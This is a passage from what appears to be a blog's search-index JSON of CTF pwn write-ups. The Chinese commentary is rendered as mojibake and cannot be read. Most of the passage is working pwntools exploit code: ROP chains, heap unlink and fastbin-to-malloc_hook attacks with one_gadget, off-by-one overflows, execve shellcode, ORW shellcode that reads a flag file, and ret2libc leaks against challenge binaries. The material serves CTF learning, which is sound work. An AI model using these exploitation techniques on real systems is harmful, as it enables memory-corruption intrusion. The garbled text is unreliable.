libc_base + 0x286890 # Create link map link_map = p64(0) link_map += p64(l_next_address) link_map += p64(0) link_map += p64(heap_leak_adjusted + 0x940) link_map += p64(0) * 28 link_map += p64(heap_leak_adjusted + 0xa50) link_map += p64(heap_leak_adjusted + 0xa70) link_map += p64(heap_leak_adjusted + 0xa60) link_map += p64(0x10) link_map += p64(setcontext_address) link_map += p64(ret) link_map += p64(0) * 13 link_map += p64(heap_leak_adjusted + 0x200) link_map += b&#39;./flag&#39;.ljust(8, b&#39;\\x00&#39;) link_map += p64(0) link_map += p64(0x100) link_map += p64(0) * 2 link_map += p64(heap_leak_adjusted + 0xc60) link_map += p64(ret) link_map += p64(0) * 38 link_map += p64(0x800000000) # Create ROP chain rop_chain = p64(ret) * 0x1 rop_chain += p64(pop_rdi) + p64(heap_leak_adjusted + 0xaf0) rop_chain += p64(pop_rax) + p64(2) rop_chain += p64(pop_rsi) + p64(0) rop_chain += p64(syscall) rop_chain += p64(pop_rdi) + p64(3) rop_chain += p64(pop_rsi) + p64(heap_leak_adjusted + 0x800) rop_chain += p64(pop_rdx) + p64(0x50) + p64(0) rop_chain += p64(read_address) rop_chain += p64(pop_rdi) + p64(1) rop_chain += p64(pop_rsi) + p64(heap_leak_adjusted + 0x800) rop_chain += p64(pop_rdx) + p64(0x50) + p64(0) rop_chain += p64(write_address) # Edit chunk with link map and ROP chain edit_chunk(0, 0x400, link_map + rop_chain) # Exit and trigger the payload exit_program() io.interactive()","categories":[],"tags":[]},{"title":"easyshell","slug":"easyshell","date":"2024-05-02T14:42:19.000Z","updated":"2024-05-04T14:04:26.139Z","comments":true,"path":"2024/05/02/easyshell/","link":"","permalink":"http://example.com/2024/05/02/easyshell/","excerpt":"","text":"from pwn import* from LibcSearcher import * #p=remote(&quot;node4.buuoj.cn&quot;,) p=process(&quot;./babyheap&quot;) context.log_level=&quot;debug&quot; libc=ELF(&#39;libc.so&#39;) elf=ELF(&#39;babyheap&#39;) p.recvuntil(&#39;captcha is: &#39;) cap=p.recv(8) p.sendlineafter(&#39;the captcha: &#39;,cap) #p.sendlineafter( #p.sendlineafter(&#39;Please Select: &#39;,) def add(index,size): p.sendlineafter(&#39;Please Select: &#39;,&#39;1&#39;) p.sendlineafter(&#39;Index: &#39;,str(index)) p.sendlineafter(&#39;Size: &#39;,str(size)) def fill(size,content): p.sendlineafter(&#39;Please Select: &#39;,&#39;3&#39;) p.sendlineafter(&#39;Size: &#39;,str(size)) p.sendlineafter(&#39;Content: &#39;,content) gdb.attach(p) sleep(1) add(20,0x60) p.interactive()","categories":[],"tags":[]},{"title":"heap","slug":"heap","date":"2024-04-27T13:35:10.000Z","updated":"2024-05-16T13:11:28.313Z","comments":true,"path":"2024/04/27/heap/","link":"","permalink":"http://example.com/2024/04/27/heap/","excerpt":"","text":"chunkå°±æ˜¯ä¸€æ•´ä¸ª mallocè¿”å›çš„æŒ‡é’ˆæŒ‡å‘chunkçš„æ•°æ®åŒºåŸŸ freeè¿”å›çš„æŒ‡é’ˆæŒ‡å‘chunkçš„header pre_sizeåªæœ‰åœ¨ä¸Šä¸€ä¸ªchunkï¼ˆç‰©ç†ç›¸é‚»ï¼‰æ˜¯é‡Šæ”¾æ—¶æ‰å±äºä¸‹ä¸€ä¸ªchunkçš„åŒºåŸŸï¼Œå¦åˆ™å±äºä¸Šä¸€ä¸ªchunkçš„ free_chunkçš„å¤§å° 0x20~0x0x80,malloc(8)å¾—åˆ°çš„æ˜¯0x20çš„chunk","categories":[],"tags":[]},{"title":"note2","slug":"note2","date":"2024-04-26T11:00:38.000Z","updated":"2024-04-28T15:31:44.297Z","comments":true,"path":"2024/04/26/note2/","link":"","permalink":"http://example.com/2024/04/26/note2/","excerpt":"","text":"æ²¡å¼€åç§»çš„ä¿æŠ¤ sizeæ˜¯æ— ç¬¦å·æ•° è¿›å‡½æ•°åå˜æœ‰ç¬¦å·æ•°ï¼Œä¼šæœ‰æº¢å‡º è¿™é‡Œåªèƒ½ç”¨å­—èŠ‚æ¥å¡«å……ï¼Œbâ€™\\x00â€™éƒ½ä¸è¡Œ æ”¹äº†free_gotæ‰freeçš„ï¼Œä¼šæ‰§è¡Œone_gadget ç”¨systemæ‰“ä¼šæŠ¥é”™ï¼Œä¸è¡Œ å› ä¸ºè¿™é‡Œæœ‰ä¸ªstrncat(dest, (const char *)v7 + 15, 0xFFFFFFFFFFFFFFFFLL);å‡½æ•°ï¼Œé‡åˆ°â€˜\\0â€™æˆ–ç©ºå­—ç¬¦æˆªåœ expfrom pwn import* from LibcSearcher import * #p=remote(&quot;node5.buuoj.cn&quot;,27431) p=process(&quot;./note2&quot;) context.log_level=&quot;debug&quot; libc=ELF(&#39;./libc-2.23.so&#39;) elf=ELF(&#39;./note2&#39;) p.sendlineafter(&#39; name:&#39;,&#39;sdf&#39;) p.sendlineafter(&#39;address:&#39;,&#39;asdf&#39;) def add(size,content): p.sendlineafter(&#39;option---&gt;&gt;&#39;,&#39;1&#39;) p.sendlineafter(&#39;(less than 128)&#39;,str(size)) p.sendlineafter(&#39; content:&#39;,content) def show(index): p.recvuntil(&quot;&gt;&gt;&quot;) p.sendline(&quot;2&quot;) p.recvuntil(&quot;:&quot;) p.sendline(str(index)) def edit(index, choice, content): p.recvuntil(&quot;&gt;&gt;&quot;) p.sendline(&quot;3&quot;) p.recvuntil(&quot;:&quot;) p.sendline(str(index)) p.recvuntil(&quot;]&quot;) p.sendline(str(choice)) p.recvuntil(&quot;:&quot;) p.sendline(content) def free(index): p.recvuntil(&quot;&gt;&gt;&quot;) p.sendline(&quot;4&quot;) p.recvuntil(&quot;:&quot;) p.sendline(str(index)) &#39;&#39;&#39; io.recvuntil(&quot;:&quot;) io.sendline(&quot;/bin/sh&quot;) #name io.recvuntil(&quot;:&quot;) io.sendline(&quot;ddd&quot;) &#39;&#39;&#39; ptr=0x602120 fd=ptr-0x18 bk=ptr-0x10 payload=b&#39;\\x00&#39;*8+p64(0xa1)+p64(fd)+p64(bk) add(0x80,payload) #0 add(0,&#39;sadf&#39;) #1 add(0x80,&#39;bin/sh&#39;) #2 free(1) payload=p64(0)*2+p64(0xa0)+p64(0x90) add(0,payload) free(2) #b&#39;a&#39;*0x18 free_got=elf.got[&#39;free&#39;] payload=b&#39;a&#39;*0x18+p64(free_got) edit(0,1,payload) gdb.attach(p) sleep(1) show(0) p.recvuntil(&#39;is &#39;) addr=u64(p.recv(6).ljust(8,b&#39;\\x00&#39;)) base=addr-libc.sym[&#39;free&#39;] system=base+libc.sym[&#39;system&#39;] one=base+0xf02a4 edit(0,1,p64(system)) print(hex(addr)) #p.sendline(payload) p.interactive()","categories":[],"tags":[]},{"title":"ciscn_final_5","slug":"ciscn-final-5","date":"2024-04-11T11:36:41.000Z","updated":"2024-04-11T13:45:47.262Z","comments":true,"path":"2024/04/11/ciscn-final-5/","link":"","permalink":"http://example.com/2024/04/11/ciscn-final-5/","excerpt":"","text":"æ²¡å¼€åç§»çš„ä¿æŠ¤ åœ°å€è¿›è¡Œæˆ–è¿ç®—åä¿å­˜ï¼Œæœ€åä¸€ä½å­˜index","categories":[],"tags":[]},{"title":"GUESS","slug":"GUESS","date":"2024-03-23T10:34:29.000Z","updated":"2024-03-23T13:22:26.501Z","comments":true,"path":"2024/03/23/GUESS/","link":"","permalink":"http://example.com/2024/03/23/GUESS/","excerpt":"","text":"å¼€äº†canary åœ¨è¾“å…¥ä½ç½®å¯¹åº”çš„ç¬¬25ä¸ªå‚æ•°ï¼Œç›¸å·®0x128çš„ä½ç½®ä¸Šæ˜¯mainå‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°argc,åé¢æ˜¯ç¬¬ä¸‰ä¸ªenvpå‚æ•° æŠŠargcçš„ä½ç½®è¦†ç›–æˆputs_got,æ³„éœ²åç§»ï¼Œç®—å‡ºenviron=base+libc.sym[â€˜__environâ€™],è¿™ä¸ªå­˜ç€æ ˆä¸Šçš„åœ°å€ï¼Œå³0x7ffdfb3b9728è¿™ä¸ªåœ°å€ï¼Œè¿™ä¸ªåœ°å€å­˜ç€ç¯å¢ƒå˜é‡ï¼Œå†è¦†ç›–argcä¸ºenvironï¼Œæ‰“å°å‡ºæ ˆåœ°å€ï¼Œå†ç®—åç§»æœ¬åœ°ä¸€ç›´æ‰“ä¸é€šï¼Œè°ƒè¯•ä¹Ÿæœ‰é—®é¢˜expfrom pwn import* from LibcSearcher import * #p=remote(&quot;node5.buuoj.cn&quot;,26222) p=process(&quot;./GUESS&quot;) context.log_level=&quot;debug&quot; elf=ELF(&#39;./GUESS&#39;) puts_got=elf.got[&#39;puts&#39;] libc=ELF(&#39;./libc-2.23.so&#39;) payload=b&#39;a&#39;*0x128+p64(puts_got) p.recvuntil(&#39; guessing flag&#39;) p.sendline(payload) p.recvuntil(&#39;detected ***: &#39;) puts_addr=u64(p.recvuntil(&#39;\\x7f&#39;).ljust(8,b&#39;\\x00&#39;)) print(hex(puts_addr)) base=puts_addr-libc.sym[&#39;puts&#39;] environ=base+libc.sym[&#39;__environ&#39;] payload=b&#39;a&#39;*0x128+p64(environ) gdb.attach(p) p.recvuntil(&#39; guessing flag&#39;) p.sendline(payload) p.recvuntil(&#39;detected ***: &#39;) envi=u64(p.recvuntil(&#39;\\x7f&#39;).ljust(8,b&#39;\\x00&#39;)) print(hex(envi)) flag=envi-0x168 payload=b&#39;a&#39;*0x128+p64(flag) p.recvuntil(&#39; guessing flag&#39;) p.sendline(payload) p.interactive()","categories":[],"tags":[]},{"title":"bad","slug":"bad","date":"2024-03-22T06:08:42.000Z","updated":"2024-03-22T08:09:43.077Z","comments":true,"path":"2024/03/22/bad/","link":"","permalink":"http://example.com/2024/03/22/bad/","excerpt":"","text":"å¾ˆæ˜æ˜¾åœ°ç”¨shellcodeå†™ï¼Œä¸è¿‡ä¸èƒ½ç”¨ä¸€èˆ¬çš„shellcodeæ¥å†™,å¹³æ—¶çš„shellcodeæ˜¯ç”¨é€šè¿‡ç³»ç»Ÿè°ƒç”¨exceve(â€˜bin/shâ€™,0,0),æ­£å¦‚è¿™é“é¢˜ï¼Œseccompæ˜¯Linuxå†…æ ¸çš„ä¸€é¡¹åŠŸèƒ½ï¼Œç”¨äºé™åˆ¶è¿›ç¨‹çš„ç³»ç»Ÿè°ƒç”¨seccomp_init(0LL);æ˜¯åˆå§‹åŒ–seccomp_initå‡½æ•°0ï¼Œ1ï¼Œ2ï¼Œ60ï¼Œåˆ†åˆ«æ˜¯å…è®¸è¿›ç¨‹å¯è¯»ï¼Œå¯å†™ï¼Œå¯æ‰§è¡Œï¼Œå’Œé€€å‡ºçš„ç³»ç»Ÿè°ƒç”¨ æ‰€ä»¥è¿™é“é¢˜åªèƒ½ç”¨orwçš„æ–¹å¼è·å–flagmmap=0x123000 orw_payload=shellcraft.open(&#39;./flag&#39;) #æ‰“å¼€æ ¹ç›®å½•ä¸‹çš„flagæ–‡ä»¶ï¼Œæ–‡ä»¶æ ‡è¯†ç¬¦ä¸º3 orw_payload+=shellcraft.read(3,mmap,0x50) #è¯»å–æ–‡ä»¶æ ‡è¯†ç¬¦ä¸º3çš„æ–‡ä»¶çš„0x50ä¸ªå­—èŠ‚åˆ°åœ°å€mmap orw_payload+=shellcraft.write(1,mmap,0x50) #å°†mmapçš„åœ°å€çš„å€¼è¾“å‡º ä¸æŠŠorw_payloadå†™åˆ°æ ˆä¸Šå› ä¸ºå…¶å¾ˆå¤§ æ‰€ä»¥åªèƒ½å†™åˆ°mmapåœ°å€ä¸Šï¼Œè¿”å›åœ°å€è®©å…¶æ‰§è¡Œåˆ°æ ˆä¸Šè¯»å…¥orw-payloadåˆ°mmapä¸Š jmp_rsp_ret=asm(&#39;sub rsp,0x30;jmp rsp&#39;) get_shell=asm(&#39;mov rax,0x123000;call rax&#39;) payload=asm(shellcraft.read(0,mmap,0x100))+get_shell payload=payload.ljust(0x28,b&#39;\\x00&#39;) payload+=p64(jmp_rsp)+jmp_rsp_ret# å®è·µè¯æ˜ï¼Œè¿”å›åœ°å€ä¸èƒ½ç›´æ¥sub rsp,0x30;jmp rsp,å¾—å…ˆjmp esp,ä¸ç„¶ä¼šæŠ¥é”™ï¼Œä½†æˆ‘è§‰å¾—æœ€ç»ˆçš„ç»“æœéƒ½å·®ä¸å¤šï¼Œä½†æ˜¯ä¸è¡Œã€‚æœ€åå†å†™å…¥orw_payloadå°±è¡Œäº†p.sendline(asm(orw_payload))","categories":[],"tags":[]},{"title":"b0verfl0w","slug":"b0verfl0w","date":"2024-03-20T15:07:25.000Z","updated":"2024-03-21T05:02:55.946Z","comments":true,"path":"2024/03/20/b0verfl0w/","link":"","permalink":"http://example.com/2024/03/20/b0verfl0w/","excerpt":"","text":"; æ±‡ç¼–æŒ‡ä»¤ xor ecx, ecx ; å°† ecx å¯„å­˜å™¨æ¸…é›¶ mul ecx ; å°† eax å¯„å­˜å™¨ä¸­çš„å€¼ä¸ ecx å¯„å­˜å™¨ä¸­çš„å€¼ç›¸ä¹˜ï¼Œç»“æœå­˜æ”¾åœ¨ eax å’Œ edx ä¸­ï¼Œç›¸å½“äº edx = eax * 0 push ecx ; å°† ecx å¯„å­˜å™¨ä¸­çš„å€¼å‹å…¥æ ˆï¼Œæ­¤æ—¶æ ˆé¡¶ä¸º 0 push 0x68732f2f ; å°†å­—ç¬¦ä¸² &quot;/bin//sh&quot; çš„ ASCII ç é€†åºå‹å…¥æ ˆ push 0x6e69622f ; ç»§ç»­å°†å­—ç¬¦ä¸² &quot;/bin//sh&quot; çš„ ASCII ç é€†åºå‹å…¥æ ˆ mov ebx, esp ; å°† esp å¯„å­˜å™¨ä¸­çš„å€¼ï¼ˆå³å­—ç¬¦ä¸² &quot;/bin//sh&quot; çš„åœ°å€ï¼‰å­˜æ”¾åˆ° ebx å¯„å­˜å™¨ä¸­ mov al, 0xb ; å°† 0xb å­˜æ”¾åˆ° al å¯„å­˜å™¨ä¸­ï¼Œè¯¥å€¼ä»£è¡¨ execve ç³»ç»Ÿè°ƒç”¨çš„ç¼–å· int 0x80 ; è§¦å‘ç³»ç»Ÿè°ƒç”¨ï¼Œæ‰§è¡Œ execve(&quot;/bin//sh&quot;, NULL, NULL) shellcode=b&quot;\\x31\\xc9\\xf7\\xe1\\x51\\x68\\x2f\\x2f\\x73&quot;+b&quot;\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0&quot;+b&quot;\\x0b\\xcd\\x80&quot; ret2shellcode,ä½†æ˜¯å¤§å°ä¸å¤Ÿäº† sub_esp_jmp=asm(&quot;sub esp,0x28;jmp esp&quot;) æ”¹å†™å…¶ä»–ä¸è¡Œè¿”å›åœ°å€æ‰§è¡Œåˆ°jmp_esp,ç„¶åesp+4ï¼Œæ‰§è¡Œsub esp,0x28;jmp espï¼Œå¯ä»¥è·³åˆ°shellcodeçš„åœ°å€payload=asm(shellcode)+b&#39;a&#39;*(0x20-len(shellcode))+b&#39;aaaa&#39;+p32(jmp_esp)+sup_esp_jmp jmp espçš„æ“ä½œï¼ŒæŠŠæ ˆé¡¶è®¾ä¸ºesp,åŒæ—¶eipæŒ‡å‘æ ˆé¡¶ expfrom pwn import* from LibcSearcher import * #p=remote(&quot;node5.buuoj.cn&quot;,28594) p=process(&quot;./b0verfl0w&quot;) context.log_level=&quot;debug&quot; context.arch=&#39;i386&#39; shellcode=b&quot;\\x31\\xc9\\xf7\\xe1\\x51\\x68\\x2f\\x2f\\x73&quot;+b&quot;\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0&quot;+b&quot;\\x0b\\xcd\\x80&quot; print(len(shellcode)) #gdb.attach(p) sleep(1) jmp_esp=0x08048504 sub_esp_jmp=asm(&quot;sub esp,0x28;jmp esp&quot;) payload=shellcode+b&#39;a&#39;*(0x20-len(shellcode))+b&#39;aaaa&#39;+p32(jmp_esp)+sub_esp_jmp #p.sendline(payload) p.sendline(payload) p.interactive()","categories":[],"tags":[]},{"title":"roarctf_2019_easypwn","slug":"roarctf-2019-easy-pwn","date":"2024-03-18T15:03:09.000Z","updated":"2024-03-20T07:43:53.545Z","comments":true,"path":"2024/03/18/roarctf-2019-easy-pwn/","link":"","permalink":"http://example.com/2024/03/18/roarctf-2019-easy-pwn/","excerpt":"","text":"ä¿æŠ¤å…¨å¼€ editå‡½æ•° è‹¥è¦ç¼–è¾‘çš„å¤§å°å¤§è¿‡ç”³è¯·çš„10ï¼Œå¯ä»¥å¤šè¾“å…¥ä¸€å­—èŠ‚ï¼Œå­˜åœ¨off-by-oneæ¼æ´ è¿™é‡Œä¸å¤ªæ‡‚ä¸ºä»€ä¹ˆä¼ªé€ çš„å †1 freeä¸ä¼šæŠ¥é”™ free(1) add(0x90) è¯•ç”¨è¿™ç§æ–¹æ³•ä¹Ÿèƒ½showå‡ºmain_arena è‡³äºä¸ºä»€ä¹ˆèƒ½showï¼Œä¹Ÿæ˜¯æŒºå¥‡æ€ªçš„ï¼Œå› ä¸ºåœ¨showå‡½æ•°é‚£é‡Œé™åˆ¶äº†å¤§å°ï¼Œå–çš„æ˜¯åŸæ¥çš„å¤§å° add(0x80) å¥‡æ€ªï¼Œè¿™é‡Œå†ç”³è¯·0x80çš„å¤§å°ï¼Œç„¶åsizeè¿˜æ˜¯0xa1 è¿™é‡Œä¹Ÿä¸å¤ªæ‡‚ä¸ºä»€ä¹ˆè¦è¿™æ ·å†™,åé¢çš„p64(0x70)+p64(0x21)payload=p64(0)*3+p64(0x71)+p64(0)*12+p64(0x70)+p64(0x21) ä¸è¿‡æœ€åçš„è¯ï¼Œæ˜¯æ‰“ä¸é€šçš„ã€‚expfrom pwn import * r=remote(&#39;node5.buuoj.cn&#39;,28118) #r=process(&#39;roarctf_2019_easy_pwn&#39;) libc=ELF(&#39;./libc-2.23.so&#39;) context.log_level=&quot;debug&quot; def add(size): r.recvuntil(&#39;choice: &#39;) r.sendline(&#39;1&#39;) r.recvuntil(&#39;size:&#39;) r.sendline(str(size)) def edit(index,size,data): r.recvuntil(&#39;choice: &#39;) r.sendline(&#39;2&#39;) r.recvuntil(&#39;index:&#39;) r.sendline(str(index)) r.recvuntil(&#39;size:&#39;) r.sendline(str(size)) r.recvuntil(&#39;content:&#39;) r.send(data) def free(index): r.recvuntil(&#39;choice: &#39;) r.sendline(&#39;3&#39;) r.recvuntil(&#39;index:&#39;) r.sendline(str(index)) def show(index): r.recvuntil(&#39;choice: &#39;) r.sendline(&#39;4&#39;) r.recvuntil(&#39;index:&#39;) r.sendline(str(index)) add(0x18) add(0x10) add(0x90) add(0x10) edit(0,0x22,b&#39;b&#39;*0x10+p64(0x20)+p8(0xa1)) edit(2,0x80,p64(0)*14+p64(0xa0)+p64(0x21)) free(1) add(0x90) edit(1,0x20,p64(0)*3+p64(0xa1)) free(2) show(1) r.recvuntil(&#39;content:&#39;) r.recv(0x20) main_arena=u64(r.recvuntil(&#39;\\x7f&#39;).strip()[-6:].ljust(8,b&#39;\\x00&#39;))-88 malloc_hook=main_arena-0x10 base=malloc_hook-libc.sym[&#39;__malloc_hook&#39;] realloc_hook=base+libc.sym[&#39;__realloc_hook&#39;] add(0x80) print(hex(main_arena)) payload=p64(0)*3+p64(0x71)+p64(0)*12+p64(0x70)+p64(0x21) edit(1,0x90,payload) free(2) payload=p64(0)*3+p64(0x71)+p64(malloc_hook-0x23) edit(1,0x28,payload) add(0x60) #2 add(0x60) #4 one=[0x45216,0x4526a,0xf02a4,0xf1147] one_gadget=base+one[3] edit(4,0x1b,b&#39;a&#39;*11+p64(one_gadget)+p64(realloc_hook+4)) #gdb.attach(r) sleep(1) add(0x10) r.interactive()","categories":[],"tags":[]},{"title":"ciscn_2019_es_7","slug":"ciscn-2019-es-7","date":"2024-03-18T13:09:07.000Z","updated":"2024-03-18T14:42:13.095Z","comments":true,"path":"2024/03/18/ciscn-2019-es-7/","link":"","permalink":"http://example.com/2024/03/18/ciscn-2019-es-7/","excerpt":"","text":"åˆé‡srop unixåœ¨ç³»ç»Ÿå‘ç”Ÿsignalæ—¶ä¼šé—´æ¥è°ƒç”¨sigreturn,ucontext,siginfoç­‰ä¼šè¢«å‹å…¥æ ˆä¸­,è¿™ä¸€æ®µç§°ä¸ºsignal frame è¦ç”¨sropï¼Œéœ€æ»¡è¶³å‡ ä¸ªæ¡ä»¶ å¯ä»¥é€šè¿‡æ ˆæº¢å‡ºæ§åˆ¶æ ˆçš„å†…å®¹ã€‚ éœ€è¦çŸ¥é“ç›¸åº”çš„åœ°å€ã€‚ â€œ/bin/shâ€ â€‹ Signal Frame â€‹ syscall â€‹ sigreturn é¢˜ç›®ä¸­å·²ç»ç»™äº†æˆ‘ä»¬gadgetsçš„åœ°å€ é¦–å…ˆå¯ä»¥æ‰“å°å‡ºæ ˆåœ°å€ å…¶æ¬¡è¿”å›åœ°å€å†™ä¸Šäº†0x4004F1,æ‰“å°å®Œä¼šå†æ¬¡è¿”å›funcå‡½æ•°","categories":[],"tags":[]},{"title":"hitcon2014_stkof","slug":"hitcon2014-stkof","date":"2024-03-16T14:10:58.000Z","updated":"2024-03-17T07:16:45.266Z","comments":true,"path":"2024/03/16/hitcon2014-stkof/","link":"","permalink":"http://example.com/2024/03/16/hitcon2014-stkof/","excerpt":"","text":"åç§»éƒ½æ²¡å¼€ï¼Œæœ‰ä¸ªå †æº¢å‡ºæ¼æ´ï¼Œåˆšå·§ä¸ä¹…å‰åšäº†ä¸€é“å †æº¢å‡ºï¼Œä½†æ˜¯åšæ³•å¯¹äºè¿™é“é¢˜æ²¡ä»€ä¹ˆç”¨ï¼Œæ²¡æœ‰showå‡½æ•°ï¼Œæ²¡æœ‰åç§»ä¿æŠ¤å¯ä»¥ç”¨unlinkadd(0x30) #1 add(0x30) #2 add(0x80) #3 add(0x30) #4 bss=0x602140+0x10 fd=bss-0x18 bk=bss-0x10 payload=p32(0)+p32(0x30) payload+=p64(fd)+p64(bk) payload+=p64(0)*2 payload+=p64(0x30)+p64(0x90) edit(2,payload)","categories":[],"tags":[]},{"title":"inndy_rop","slug":"inndy-rop","date":"2024-03-14T11:42:22.000Z","updated":"2024-03-14T11:54:01.299Z","comments":true,"path":"2024/03/14/inndy-rop/","link":"","permalink":"http://example.com/2024/03/14/inndy-rop/","excerpt":"","text":"é™¤äº†ä¸ªgetså‡½æ•°å•¥ä¹Ÿæ²¡æœ‰äº† ç›´æ¥ ROPgadget â€”binary inndy_rop â€”ropchain from pwn import* from struct import pack from LibcSearcher import * #p=remote(&quot;node4.buuoj.cn&quot;,) r=process(&quot;./inndy_rop&quot;) context.log_level=&quot;debug&quot; p=b&#39;a&#39;*(0xc+4) p += pack(&#39;&lt;I&#39;, 0x0806ecda) # pop edx ; ret p += pack(&#39;&lt;I&#39;, 0x080ea060) # @ .data p += pack(&#39;&lt;I&#39;, 0x080b8016) # pop eax ; ret p += b&#39;/bin&#39; p += pack(&#39;&lt;I&#39;, 0x0805466b) # mov dword ptr [edx], eax ; ret p += pack(&#39;&lt;I&#39;, 0x0806ecda) # pop edx ; ret p += pack(&#39;&lt;I&#39;, 0x080ea064) # @ .data + 4 p += pack(&#39;&lt;I&#39;, 0x080b8016) # pop eax ; ret p += b&#39;//sh&#39; p += pack(&#39;&lt;I&#39;, 0x0805466b) # mov dword ptr [edx], eax ; ret p += pack(&#39;&lt;I&#39;, 0x0806ecda) # pop edx ; ret p += pack(&#39;&lt;I&#39;, 0x080ea068) # @ .data + 8 p += pack(&#39;&lt;I&#39;, 0x080492d3) # xor eax, eax ; ret p += pack(&#39;&lt;I&#39;, 0x0805466b) # mov dword ptr [edx], eax ; ret p += pack(&#39;&lt;I&#39;, 0x080481c9) # pop ebx ; ret p += pack(&#39;&lt;I&#39;, 0x080ea060) # @ .data p += pack(&#39;&lt;I&#39;, 0x080de769) # pop ecx ; ret p += pack(&#39;&lt;I&#39;, 0x080ea068) # @ .data + 8 p += pack(&#39;&lt;I&#39;, 0x0806ecda) # pop edx ; ret p += pack(&#39;&lt;I&#39;, 0x080ea068) # @ .data + 8 p += pack(&#39;&lt;I&#39;, 0x080492d3) # xor eax, eax ; ret p += pack(&#39;&lt;I&#39;, 0x0807a66f) # inc eax ; ret p += pack(&#39;&lt;I&#39;, 0x0807a66f) # inc eax ; ret p += pack(&#39;&lt;I&#39;, 0x0807a66f) # inc eax ; ret p += pack(&#39;&lt;I&#39;, 0x0807a66f) # inc eax ; ret p += pack(&#39;&lt;I&#39;, 0x0807a66f) # inc eax ; ret p += pack(&#39;&lt;I&#39;, 0x0807a66f) # inc eax ; ret p += pack(&#39;&lt;I&#39;, 0x0807a66f) # inc eax ; ret p += pack(&#39;&lt;I&#39;, 0x0807a66f) # inc eax ; ret p += pack(&#39;&lt;I&#39;, 0x0807a66f) # inc eax ; ret p += pack(&#39;&lt;I&#39;, 0x0807a66f) # inc eax ; ret p += pack(&#39;&lt;I&#39;, 0x0807a66f) # inc eax ; ret p += pack(&#39;&lt;I&#39;, 0x0806c943) # int 0x80 #gdb.attach(p) #sleep(1) r.sendline(p) r.interactive()","categories":[],"tags":[]},{"title":"level4","slug":"level4","date":"2024-03-14T06:50:21.000Z","updated":"2024-03-14T07:27:10.251Z","comments":true,"path":"2024/03/14/level4/","link":"","permalink":"http://example.com/2024/03/14/level4/","excerpt":"","text":"åªå¼€äº†NXä¿æŠ¤ï¼Œ32ä½æ ˆæº¢å‡ºã€‚ elf = ELF(proc_name) write_plt = elf.plt[&#39;write&#39;] write_got = elf.got[&#39;write&#39;] main_addr = elf.sym[&#39;main&#39;] payload = b&#39;a&#39; * (0x88 + 0x4) + p32(write_plt) + p32(main_addr) + p32(0x1) + p32(write_got) + p32(0x4) æ²¡è°ƒç”¨writeå‡½æ•°å‰ gotè¡¨å­˜çš„æ˜¯å¯»å€çš„åœ°å€è·³è½¬åˆ°write_gotå­˜çš„åœ°å€write_plt+6 æ€»ç»“èµ·æ¥å°±æ˜¯ï¼Œæ²¡è°ƒç”¨writeå‡½æ•°ä¹‹å‰ï¼Œwrite_gotå­˜çš„æ˜¯write_plt+6è¿™ä¸ªåœ°å€ï¼Œç„¶åæ‰§è¡Œwrite_pltä¼šå»write_goté‡Œæ‰¾writeå‡½æ•°çœŸæ­£çš„åœ°å€ï¼Œæ­¤æ—¶ä¼šæ‰§è¡Œwrite_plt+6è¿™ä¸ªåœ°å€å¯»å€ï¼Œæ‰¾åˆ°writeå‡½æ•°çœŸæ­£çš„åœ°å€åä¼šæŠŠå®ƒå­˜å…¥write_got. expfrom pwn import * from LibcSearcher import * context.log_level = &#39;debug&#39; proc_name = &#39;./level4&#39; p = process(proc_name) #p=remote(&#39;node5.buuoj.cn&#39;,29402) elf = ELF(proc_name) write_plt = elf.plt[&#39;write&#39;] write_got = elf.got[&#39;write&#39;] main_addr = elf.sym[&#39;main&#39;] payload = b&#39;a&#39; * (0x88 + 0x4) + p32(write_plt) + p32(main_addr) + p32(0x1) + p32(write_got) + p32(0x4) gdb.attach(p) sleep(1) p.send(payload) write_addr = u32(p.recv(4)) print(hex(write_addr)) #libc = LibcSearcher(&#39;write&#39;, write_addr) libc=ELF(&#39;./libc-2.23_32.so&#39;) libc_base = write_addr - libc.sym[&#39;write&#39;] system_addr = libc_base + libc.sym[&#39;system&#39;] str_bin_sh = libc_base + next(libc.search(b&#39;bin/sh&#39;)) payload1 = b&#39;a&#39; * (0x88 + 0x4) + p32(system_addr) + p32(main_addr) + p32(str_bin_sh) p.send(payload1) p.interactive()","categories":[],"tags":[]},{"title":"babyheap_0ctf_2017","slug":"babyheap-0ctf-2017","date":"2024-03-13T11:11:48.000Z","updated":"2024-03-14T06:27:37.456Z","comments":true,"path":"2024/03/13/babyheap-0ctf-2017/","link":"","permalink":"http://example.com/2024/03/13/babyheap-0ctf-2017/","excerpt":"","text":"ä¿æŠ¤å…¨å¼€ malloc,addéƒ½æ•´å¾—æŒºæŠ½è±¡çš„ï¼Œä½†éƒ½å¤§åŒå°å¼‚ã€‚è¿™é“é¢˜è¿˜æ˜¯æŒºæœ‰éš¾åº¦çš„æœ‰ä¸ªå¡«å……çš„æ—¶å€™çš„sizeå¯ä»¥å¤§äºè‡ªå·±ç”³è¯·çš„ï¼Œæœ‰ä¸ªå †æº¢å‡ºæ¼æ´ã€‚ å°è¯•æ”¹ä¸‹ä¸ªå †çš„sizeï¼Œå†é‡Šæ”¾ï¼Œå†mallocï¼Œä¼šæŠ¥é”™ï¼Œè¿™ä¸ªæ–¹æ³•ä¸è¡Œã€‚ æ”¹æ‰äº†binæŒ‡é’ˆ å †2æ˜¯æŒ‡å‘free_chunkçš„ï¼Œå¡«å……å †2ä¹Ÿå°±æ˜¯åœ¨fast_binçš„æŒ‡é’ˆä¸Šå†™ä¸Šmalloc_hookä¸Šé¢çš„åœ°å€ï¼Œæº¢å‡ºå †3ä¹Ÿèƒ½æ”¹binæŒ‡é’ˆã€‚è¿™é‡Œçš„åœ°å€æœ‰ä¸€å®šçš„è¦æ±‚ã€‚ åœ¨malloc_hook-0x23çš„åœ°å€ä¸Šï¼Œdword(malloc_hook-0x23+0x8)è¿™ä¸ªåœ°å€çš„å€¼æ˜¯0x7f,æ»¡è¶³0x70å¤§å°çš„fastbinçš„å¤§å°ï¼Œæ‰€ä»¥malloc_hook-0x23è¿™ä¸ªåœ°å€å¯ä»¥å½“ä½œfake_addr,å†å¡«å……0x13å­—èŠ‚åˆ°malloc_hook,å†™ä¸Šone_gadget. expfrom pwn import* from LibcSearcher import * #p=remote(&quot;node5.buuoj.cn&quot;,26041) p=process(&quot;./babyheap_0ctf_2017&quot;) context.log_level=&quot;debug&quot; context(arch=&#39;amd64&#39;,os=&#39;linux&#39;) libc=ELF(&#39;./libc-2.23.so&#39;) def add(size): 